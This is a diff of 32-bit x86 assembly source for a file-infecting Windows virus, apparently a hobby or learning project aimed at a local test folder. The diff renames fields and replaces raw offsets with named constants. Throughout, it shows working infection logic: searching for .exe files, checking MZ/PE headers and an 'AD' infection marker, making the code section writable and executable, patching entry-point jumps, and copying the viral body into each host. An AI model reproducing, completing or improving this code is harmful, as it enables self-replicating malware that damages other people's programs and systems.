@@ -39,7 +39,7 @@ struc DATA
     .WriteFile:               resd 1
 
     ; directory listing data
-    .FIND_DATA:               resb 592
+    .findData:                resb FIND_DATA.size
 
     ; infection data
     .fileAlign:               resd 1
@@ -67,6 +67,10 @@ struc DATA
     .virusAddress:            resd 1
     .virusLocation:           resd 1
     .oldVSOfLast:             resd 1
+
+    ; payload data    
+    .overlapped:             resb OVERLAPPED.size
+    
     .size:
 endstruc
 
@@ -79,7 +83,7 @@ section .data
 section .text
 _main:
     mov     ebp, esp                            ; for correct debugging
-
+    
 startOfVirus:
 
     call    getEIP                              ; retrieving current location
@@ -176,7 +180,7 @@ discard:
 
     ; Now we begin with the business of infecting some files
 
-    ; SetCurrentDirectory ;TODO FIXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    ; SetCurrentDirectory                   ; TODO FIXXXXXXXXXXXXXXXXXXXXXXXXXXXX
     mov     ebx, [ebp + DATA.EIP]
     add     ebx, directory - anchor
     push    ebx
@@ -184,7 +188,7 @@ discard:
 
 
     ; find first file
-    lea     ebx, [ebp + DATA.FIND_DATA]
+    lea     ebx, [ebp + DATA.findData]
     push    ebx                             ; Push the address of the search record
     mov     ebx, [ebp + DATA.EIP]           ; Compute pointer to file mask
     add     ebx, exestr - anchor
@@ -192,21 +196,21 @@ discard:
     call    [ebp + DATA.FindFirstFileA]
     cmp     eax, -1
     jz      doneInfecting
-    mov     edi, eax                        ; edi will store the file handle
-    mov     esi, [ebp + DATA.FIND_DATA + 44]; read pointer to file name
-    mov     ecx, [ebp + DATA.FIND_DATA + 32]; read file size (lower 4 bytes)
+    mov     edi, eax                                            ; edi will store the file handle
+    mov     esi, [ebp + DATA.findData + FIND_DATA.cFileName]    ; read pointer to file name
+    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow] ; read file size (lower 4 bytes)
     call    InfectFile
 again:
-    lea     ebx, [ebp + DATA.FIND_DATA]
+    lea     ebx, [ebp + DATA.findData]
     push    ebx                             ; Push the address of the search record
     mov     ecx, edi
     push    ecx                             ; Push the file handle
     call    [ebp + DATA.FindNextFileA]
     cmp     eax, 0
     jz      doneInfecting
-    PRINT_FILE [ebp + DATA.FIND_DATA + 44]
-    mov     esi, [ebp + DATA.FIND_DATA + 44]
-    mov     ecx, [ebp + DATA.FIND_DATA + 32]
+    PRINT_FILE [ebp + DATA.findData + FIND_DATA.cFileName]
+    mov     esi, [ebp + DATA.findData + FIND_DATA.cFileName]
+    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow]
     call    InfectFile
     PRINT_TRACE
     jmp     again
@@ -219,21 +223,21 @@ doneInfecting:
     ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
     push    -11
     call    [ebp + DATA.GetStdHandle]
-    mov     edx, eax
+    mov     edx, eax                        ; copy the stdout handle in ebx
 
     ; WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped);
-    ;mov     eax, [EIP]
-    ;add     eax, overlapped - anchor
-    ;push    eax
-    ;push    overlapped                     ; lpOverlapped
-; TODO - make this overlapped shit work
-    push    NULL
+    xor     eax, eax                                              ; 0x00000000
+    not     eax                                                   ; 0xFFFFFFFF
+    mov     [ebp + DATA.overlapped + OVERLAPPED.offset], eax      ; set offset to 0xFFFFFFFF
+    mov     [ebp + DATA.overlapped + OVERLAPPED.offsetHigh], eax  ; set offsetHigh to 0xFFFFFFFF
+    lea     eax, [ebp + DATA.overlapped]
+    push    eax                             ; lpOverlapped
     push    NULL                            ; &lpNumberOfBytesWritten
     push    message_end - message           ; nNumberOfBytesToWrite
     mov     eax, [ebp + DATA.EIP]
     add     eax, message - anchor
     push    eax                             ; lpBuffer
-    push    edx                             ; hFile
+    push    edx                             ; stdout handle
     call    [ebp + DATA.WriteFile]
 
     add     esp, DATA.size                  ; de-allocate local variables
@@ -253,7 +257,7 @@ InfectFile:
 
     PRINTD "originalFileSize", ecx
     mov     [ebp + DATA.newFileSize], ecx           ; Save file size, old size at this point
-    mov     ebx, 0
+    xor     ebx, ebx
     mov     [ebp + DATA.infectionFlag], ebx         ; Reset the infection flag
     add     ecx, virusLen                           ; ECX = victim filesize + virus
     add     ecx, 1000h                              ; ECX = victim filesize + virus + 1000h
@@ -263,7 +267,7 @@ InfectFile:
     ;; save the original attributes
 
     mov     [ebp + DATA.fileOffset], esi            ; ESI = pointer to filename ***
-    lea     ebx, [ebp + DATA.FIND_DATA + 44]
+    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
     cmp     eax, 0
@@ -272,7 +276,7 @@ InfectFile:
     ;; set the nomral attributes to the file
 
     push    80h                                     ; 80h = FILE_ATTRIBUTE_NORMAL
-    lea     ebx, [ebp + DATA.FIND_DATA + 44]
+    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.SetFileAttributesA]         ; Get the file attributes
 
@@ -283,10 +287,10 @@ InfectFile:
     push    3                                       ; Open existing file
     push    0                                       ; Security option = default
     push    1                                       ; File share for read
-    mov     ebx, 80000000h
-    or      ebx, 40000000h
+    mov     ebx, WRITABLE
+    or      ebx, READABLE
     push    ebx                                     ; General write and read
-    lea     ebx, [ebp + DATA.FIND_DATA + 44]
+    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.CreateFileA]                ; create the file
                                                     ; EAX = file handle
@@ -305,7 +309,7 @@ InfectFile:
     push    ebx
     mov     ebx, [ebp + DATA.fileHandle]
     push    ebx
-    call    [ebp + DATA.GetFileTime]                ; save time fields ;FIXME
+    call    [ebp + DATA.GetFileTime]                ; save time fields FIXME
 
     ;; create file mapping for the file
 
@@ -343,16 +347,16 @@ InfectFile:
 
     ;; check whether the mapped file is a PE file and see if its already been infected
 
-    cmp     word [esi + DOS.signature], 0x5A4D      ; 'ZM' Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
+    cmp     word [esi + DOS.signature], ZM          ; 'ZM' Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
     jne     UnmapView                               ; Error ?
-    cmp     word [esi + 38h], 0x4144                ; 'AD'  ; Already infected ?
+    cmp     word [esi + AD_OFFSET], AD              ; 'AD'  ; Already infected ?
     jne     OkGo                                    ; Is it a PE EXE file ?
-    mov     word [ebp + DATA.infectionFlag], 0FFh   ; Mark it
+    mov     word [ebp + DATA.infectionFlag], AD     ; Mark it
     jmp     UnmapView                               ; Error ?
 
 OkGo:
     mov     ebx, [esi + DOS.lfanew]                 ; EBX = PE Header RVA
-    cmp     word [esi + ebx], 0x4550                ; 'EP'  ; Is it a PE file ?
+    cmp     word [esi + ebx], EP                    ; 'EP'  ; Is it a PE file ?
     jne     UnmapView                               ; Error ?
     PRINT_TRACE ;2
 
@@ -362,7 +366,7 @@ OkGo:
     add     esi, ebx                                ; (ESI points to PE header now)
     mov     [ebp + DATA.PEHeader], esi              ; Save PE header
     mov     eax, [esi + PE.Machine]                 ; read machine field in PE Header
-    cmp     ax, 0x014c                              ; 0x014c = Intel 386
+    cmp     ax, INTEL386                            ; 0x014c = Intel 386
     jnz     UnmapView                               ; if not 32 bit, then error and quit
     mov     eax, [esi + PE.AddressOfEntryPoint]     
     mov     [ebp + DATA.oldEntryPoint], eax         ; Save Entry Point of file
@@ -375,7 +379,7 @@ OkGo:
     mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries, PE + 0x74
     shl     ebx, 3                                  ; * 8 (size of data directories)
     add     ebx, PE.size                            ; add size of PE header
-    add     ebx, [ebp + DATA.PEHeader]              ; EAX = address of the .text section
+    add     ebx, [ebp + DATA.PEHeader]              ; EBX = address of the .text section
     mov     [ebp + DATA.codeSegment], ebx
     PRINT_TRACE ;4
 
@@ -400,7 +404,6 @@ OkGo:
 
     mov     ebx, [ebp + DATA.codeSegment]
     mov     eax, [ebx + SECTIONH.PointerToRawData]  ; pointer to raw data of code segment
-    mov     ebx, [ebp + DATA.codeSegment]
     add     eax, [ebx + SECTIONH.VirtualSize]       ; virtual size of code segment
     mov     [ebp + DATA.diskEP], eax                ; where exectuable code is (entryPoint will jump here)
 
@@ -421,9 +424,9 @@ OkGo:
 
     pop   ebx                                       ; restore old PE header into ebx
 
-    or      dword [esi + SECTIONH.Characteristics], 00000020h    ; Set [CWE] flags (CODE)
-    or      dword [esi + SECTIONH.Characteristics], 20000000h    ; Set [CWE] flags (EXECUTABLE)
-    or      dword [esi + SECTIONH.Characteristics], 80000000h    ; Set [CWE] flags (WRITABLE)
+    or      dword [esi + SECTIONH.Characteristics], CODE            ; Set [CWE] flags (CODE)
+    or      dword [esi + SECTIONH.Characteristics], EXECUTABLE      ; Set [CWE] flags (EXECUTABLE)
+    or      dword [esi + SECTIONH.Characteristics], WRITABLE        ; Set [CWE] flags (WRITABLE)
 
     ;; The flags tell the loader that the section now
     ;; has executable code and is writable
@@ -501,7 +504,7 @@ OkGo:
     mov     eax, [ebp + DATA.diskEP]                    ; Align in memory to map address
     add     eax, [ebp + DATA.mapAddress]
 
-    mov     [eax], byte 0xE9                            ; relative near jump instruction
+    mov     [eax], byte JMP_NR                          ; relative near jump instruction
     mov     ebx, [ebp + DATA.lastSegment]
     mov     ebx, [ebx + SECTIONH.VirtualAddress]        ; lastSegment address
     PRINTH "lastSegment address", ebx
@@ -513,15 +516,15 @@ OkGo:
     mov     ecx, [ebp + DATA.codeSegment]
     sub     ebx, [ecx + SECTIONH.VirtualSize]           ; - codeSegment size
     PRINTH "codeSegment size", [ecx]
-    sub     ebx, 5                             ; subtract length of the jump instruction (it takes up 5 bytes of space)
-    mov     [eax + 1], ebx                     ; = 4 byte address
+    sub     ebx, JMP_NR_BYTES                           ; subtract length of the jump instruction (it takes up 5 bytes of space)
+    mov     [eax + 1], ebx                              ; write the 4 byte address of the JMP
     PRINTH "relative address jump", ebx
     PRINT_TRACE ;14
 
     mov     edi, [ebp + DATA.virusLocation]    ; Location to copy the virus to
     add     edi, [ebp + DATA.mapAddress]
     mov     eax, [ebp + DATA.EIP]
-    lea     esi, [eax - 5]                     ; Location to copy the virus from
+    lea     esi, [eax - JMP_NR_BYTES]          ; Location to copy the virus from
     mov     ecx, virusLen                      ; Number of bytes to copy
     rep     movsb                              ; Copy all the bytes
     PRINT_TRACE ;15
@@ -538,11 +541,11 @@ OkGo:
     add     ebx, [ecx + SECTIONH.VirtualSize]   ; add Size of CodeSegment
     sub     ebx, [ebp + DATA.oldEntryPoint]     ; subtract old entry point
     add     ebx, 0x1000                         ; correct for BaseOfCode
-    add     ebx, 10                             ; correct for 2 near JMPs (2 x 5 bytes)
+    add     ebx, 2*JMP_NR_BYTES                 ; correct for 2 near JMPs (2 x 5 bytes)
     add     ebx, virusLen                       ; add virusLength
     neg     ebx
-    mov     [eax], byte 0xE9
-    mov     [eax + 1], ebx
+    mov     [eax], byte JMP_NR                  ; relative near jump instruction
+    mov     [eax + 1], ebx                      ; write the 4 byte address of the JMP
     PRINT_TRACE ;17
     PRINTH "ebx", ebx
 
@@ -560,7 +563,7 @@ OkGo:
     ;; Now, lets mark the file as infected
 
     mov     esi, [ebp + DATA.mapAddress]
-    mov     word [esi + 38h], 0x4144                ;'AD'  ; Mark file as infected
+    mov     word [esi + AD_OFFSET], AD              ;'AD'  ; Mark file as infected
     PRINT_TRACE ;16
 
 UnmapView:
@@ -584,7 +587,7 @@ CloseFile:
     push    ebx
     mov     ebx, [ebp + DATA.fileHandle]
     push    ebx
-    call    [ebp + DATA.SetFileTime]                ; set time fields ;FIXME
+    call    [ebp + DATA.SetFileTime]                ; set time fields FIXME
     PRINT_TRACE
 
     ;; In order to properly close the file we must set its EOF at the exact end
@@ -615,7 +618,7 @@ CloseFile:
 
     mov     ebx, [ebp + DATA.fileAttributes]
     push    ebx
-    lea     ebx, [ebp + DATA.FIND_DATA + 44]
+    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
     push    ebx                                     ; Push the address of the search record
     PRINT_TRACE
     call    [ebp + DATA.SetFileAttributesA]
@@ -630,9 +633,9 @@ InfectionError:
 InfectionSuccessful:
     PRINT_TRACE
     mov     eax, 15
-    cmp     word[ebp + DATA.infectionFlag], 0FFh
+    cmp     word[ebp + DATA.infectionFlag], AD
     je      InfectionError
-    clc
+    clc                                             ; clear CARRY flag
 
 OutOfHere:
   PRINT_TRACE
@@ -652,11 +655,7 @@ getEIP:
     message:                db 'Good morning America!', 10
     message_end:
     directory:              db "C:\Assembly\Dummies\", 0
-    exestr:                 db "*.*", 0
-    overlapped:             istruc OVERLAPPED
-        at offset,          dd 0xFFFFFFFF
-        at offsetHigh,      dd 0xFFFFFFFF
-    iend
+    exestr:                 db "*.exe", 0
 
     hashStart:
      CloseHandle:             dd 0x59e68620
